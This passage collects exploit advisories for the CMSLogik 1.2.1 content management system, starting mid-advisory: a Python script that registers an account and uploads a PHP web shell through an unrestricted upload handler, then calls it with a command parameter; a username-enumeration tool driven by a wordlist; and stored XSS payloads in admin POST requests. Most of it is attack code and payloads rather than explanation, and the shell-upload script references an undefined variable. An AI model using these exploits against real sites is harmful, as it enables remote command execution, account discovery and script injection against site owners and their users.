# -------------------------
#
# 143: public function upload_file_ajax()
# 144: {
# 145:    $allowedExtensions = array(&#039;jpeg&#039;, &#039;jpg&#039;, &#039;gif&#039;, &#039;png&#039;, &#039;html&#039;, &#039;php&#039;, &#039;js&#039;, &#039;doc&#039;, &#039;docx&#039;, &#039;pdf&#039;, &#039;ppt&#039;, &#039;pps&#039;, &#039;pptx&#039;, &#039;ppsx&#039;);
# 146:    $sizeLimit = 10 * 1024;
# 147:    $params = array(&#039;extensions&#039; => $allowedExtensions, &#039;size&#039; => $sizeLimit);
# 148:    $this->load->library(&#039;qqfileuploader&#039;, $params);
# 149:
# 150:    $result = $this->qqfileuploader->handleUpload(&#039;./support_files&#039;);
# 151:
# 152:    echo htmlspecialchars(json_encode($result), ENT_NOQUOTES);
# 153: }
#
# ======================================================================
#
# Tested on: Apache/2.2.22
#            PHP/5.3.15
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2013-5138
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5138.php
#
#
# 05.04.2013
#
 
import json, re, sys
import urllib, urllib2, time
import cookielib, webbrowser
 
if len(sys.argv) < 3:
    print &#039;\n\n\x20-\x20\x20[*] Usage: &#039; +sys.argv[0]+ &#039; <target> <path>\n&#039;
    print &#039;\n\x20-\x20\x20[*] Example: &#039; +sys.argv[0]+ &#039; example.com cmslogik\n&#039;
    sys.exit(0)
     
host = sys.argv[1]
path = sys.argv[2]
 
def reguser():
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    username = raw_input(&#039;[+] Enter username [at least 4 characters]: &#039;)
    chk_usr = urllib.urlencode({&#039;user&#039; : username})
    try:
        xhr = json.load(opener.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;/main/unique_username_ajax&#039;, chk_usr))
        for key, value in xhr.iteritems():
            fnrand = value
            break
        if fnrand == &#039;1&#039;:
            print &#039;[!] The user &#039; +username+ &#039; is not available.&#039;
            print &#039;[!] Choose a more unique username please.&#039;
            reguser()
    except:
        print &#039;[!] No connection to host&#039;
        sys.exit(0)
    else:
        print &#039;[*] The user \&#039;&#039; +username+ &#039;\&#039; is available.&#039;
        email = raw_input(&#039;[+] Choose e-mail [unique@unique.unique]: &#039;)
        password = raw_input(&#039;[+] Choose password [at least 6 characters]: &#039;)
        reg_data = urllib.urlencode({&#039;email&#039; : email,
                         &#039;full_name&#039; : &#039;Patch&#039;,
                         &#039;password1&#039; : password,
                         &#039;password2&#039; : password,
                         &#039;r_username&#039; : username,
                         &#039;register&#039; : &#039;Register!&#039;}
                         )
        auth = opener.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;/register&#039;, reg_data)
        match = auth.read()
        if re.search(r"Sorry but that Email is already in use!", match):
            print &#039;[!] The e-mail you have chosen is already taken. Try again.&#039;
            reguser()
        elif re.search(r"You have been registered", match):
            print &#039;[*] OK.&#039;
            loguser()
        else:
            print &#039;[!] Something is fishy.&#039;
            sys.exit(0)
     
def loguser():
    print &#039;\n[*] Login please.&#039;
    username = raw_input(&#039;\n[+] Enter your username: &#039;)
    password = raw_input(&#039;[+] Enter your password: &#039;)
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    login_data = urllib.urlencode({&#039;username&#039; : username,
                       &#039;password&#039; : password,
                       &#039;login&#039; : &#039;Login&#039;,
                       &#039;remember_me&#039; : &#039;remember&#039;}
                       )
    auth = opener.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;/login&#039;, login_data)
    match = auth.read()
    if re.search(r"Error!", match):
        print &#039;\n[!] Not logged in! Try again.&#039;
        loguser()
    else:
        print &#039;\n[*] Successfully logged in!&#039;
        print &#039;[*] Uploading malicious php file...&#039;
        time.sleep(3)
        xhr2 = json.load(opener.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;//support/upload_file_ajax?qqfile=liwo_sh.php&#039;, upload_data))
        for key, value in xhr2.iteritems():
            filename = value
            break
        print &#039;[*] Your shell ID is: &#039; + filename + &#039;.php&#039;
        time.sleep(2)
        print &#039;[*] Let me open that for ya...&#039;
        time.sleep(2)
        webbrowser.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;/support_files/&#039; +filename+ &#039;.php?cmd=uname -a;id&#039;)
        print &#039;\n[*] Zya!&#039;
        sys.exit(0)
 
def menu():
    print """
(((((((((((((((((((((((((((((((((((((((((((((((((((
((                                               ((
((  Hello! CMSLogik Shell Upload 0day        ((
((                                               ((
((  1. Register a new User                   ((
((  2. Login with existing User              ((
((                                               ((
(((((((((((((((((((((((((((((((((((((((((((((((((((
 
    """
    n = raw_input(&#039;Enter choice number: &#039;);
    if n==&#039;1&#039;:
        print &#039;\n[*] Welcome to User Registration!&#039;
        reguser()
    elif n==&#039;2&#039;:
        loguser()
    else:
        print &#039;\n[?] Just 1 or 2 please...&#039;
        menu()
menu()
 
 
###############################################################################
 
 
#!/usr/bin/python
#
# CMSLogik 1.2.1 (user param) User Enumeration Weakness
#
#
# Vendor: ThemeLogik
# Product web page: http://www.themelogik.com/cmslogik
# Affected version: 1.2.1 and 1.2.0
#
# Summary: CMSLogik is built on a solid & lightweight framework
# called CodeIgniter, and design powered by Bootstrap. This
# combination allows for greater security, extensive flexibility,
# and ease of use. You can use CMSLogik for almost any niche that
# your project might fall into.
#
# Desc: The weakness is caused due to the &#039;unique_username_ajax&#039;
# script enumerating the list of valid usernames when some characters
# are provided via the &#039;user&#039; parameter.
#
# Tested on: Apache/2.2.22
#            PHP/5.3.15
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2013-5137
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5137.php
#
#
# 05.04.2013
#
 
import argparse, sys, json, urllib, urllib2, cookielib
from colorama import Fore, Back, Style, init
 
init()
 
print &#039;\n-----------------------------------------------&#039;
print &#039;User Enumeration Tool v0.1 for CMSLogik 1.2.x&#039;
print &#039;Copyleft (c) 2013, Zero Science Lab&#039;
print &#039;by lqwrm&#039;
print &#039;-----------------------------------------------\n&#039;
parser = argparse.ArgumentParser()
parser.add_argument(&#039;-t&#039;, help=&#039;target IP or hostname&#039;, action=&#039;store&#039;, dest=&#039;target&#039;)
parser.add_argument(&#039;-d&#039;, help=&#039;target dir&#039;, action=&#039;store&#039;, dest=&#039;dir&#039;)
parser.add_argument(&#039;-f&#039;, help=&#039;username wordlist&#039;, action=&#039;store&#039;, dest=&#039;file&#039;)
args = parser.parse_args()
if len(sys.argv) != 7:
    parser.print_help()
    print &#039;\n[*] Example: cmslogik_enum.py -t zeroscience.mk -d cmslogik -f users.txt&#039;
    sys.exit()
host = args.target
path = args.dir
fn = args.file
print &#039;\n&#039;
try:
    users = open(args.file, &#039;r&#039;)
except(IOError):
    print &#039;[!] Error opening \&#039;&#039; +fn+ &#039;\&#039; file.&#039;
    sys.exit()
lines = users.read().splitlines()
print &#039;[*] Loaded %d usernames for testing.\n&#039; % len(open(fn).readlines())
users.close()
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
results = open(&#039;validusers.txt&#039;, &#039;w&#039;)
for line in lines:
    chk_usr = urllib.urlencode({&#039;user&#039; : line})
    try:
        xhr = json.load(opener.open(&#039;http://&#039; +host+ &#039;/&#039; +path+ &#039;/main/unique_username_ajax&#039;, chk_usr))
    except:
        print &#039;[!] Error connecting to http://&#039; +host+ &#039;/&#039; +path
        sys.exit()
    print &#039;[+] Testing username: &#039; +Fore.GREEN+line+Fore.RESET
    for key, value in xhr.iteritems():
        fnrand = value
        break
    if fnrand == &#039;1&#039;:
        print &#039;[!] Found &#039; +Style.BRIGHT+Fore.RED+line+Style.RESET_ALL+Fore.RESET+ &#039; as valid registered user.&#039;
        results.write(&#039;%s\n&#039; % line)
results.close()
print &#039;\n[*] Enumeration completed!&#039;
print &#039;[*] Valid usernames successfully written to \&#039;validusers.txt\&#039; file.&#039;
 
 
###############################################################################
 
 
 
CMSLogik 1.2.1 Multiple Persistent XSS Vulnerabilities
 
 
Vendor: ThemeLogik
Product web page: http://www.themelogik.com/cmslogik
Affected version: 1.2.1 and 1.2.0
 
Summary: CMSLogik is built on a solid & lightweight framework
called CodeIgniter, and design powered by Bootstrap. This
combination allows for greater security, extensive flexibility,
and ease of use. You can use CMSLogik for almost any niche that
your project might fall into.
 
Desc: CMSLogik suffers from multiple stored XSS vulnerabilities
when parsing user input to several parameters via POST method.
Attackers can exploit these weaknesses to execute arbitrary HTML
and script code in a user&#039;s browser session.
 
Tested on: Apache/2.2.22
           PHP/5.3.15
 
 
Vulnerabilities discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                              @zeroscience
 
 
Advisory ID: ZSL-2013-5136
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5136.php
 
 
05.04.2013
 
--
 
==============================================================================
 
POST http://localhost/cmslogik/admin/settings HTTP/1.1
 
admin_email "onmouseover=prompt("XSS1")>
default_level   2
default_page    1
default_url http://themelogik.com/cmslogik/
email_activate  0
header_title    "onmouseover=prompt("XSS2")>
login   1
registration    1
site_title  "onmouseover=prompt("XSS3")>
update_settings Update Settings
welcome_email   0
 
==============================================================================
 
POST http://localhost/cmslogik/admin/captcha_settings HTTP/1.1
 
captcha_settings    Update
recaptcha_private   "onmouseover=prompt("XSS4")>
recaptcha_public    "onmouseover=prompt("XSS5")>
 
==============================================================================
 
POST http://localhost/cmslogik/admin/social_settings HTTP/1.1
 
fb_appid    "onmouseover=prompt("XSS6")>
fb_secret   "onmouseover=prompt("XSS7")>
social_settings Update
tw_consumer_key "onmouseover=prompt("XSS8")>
tw_consumer_secret  "onmouseover=prompt("XSS9")>
 
==============================================================================
 
POST http://localhost/cmslogik/admin/gallery/save_item_settings HTTP/1.1
 
imgid   76
long    test
short   test
slug    "onmouseover=prompt("XSS10")>
status  live
title   test
 
==============================================================================
 
POST http://localhost/cmslogik/admin/edit_menu_item_ajax HTTP/1.1
 
item_link   "onmouseover=prompt("XSS11")>
item_name   test
item_order  0
mid 9

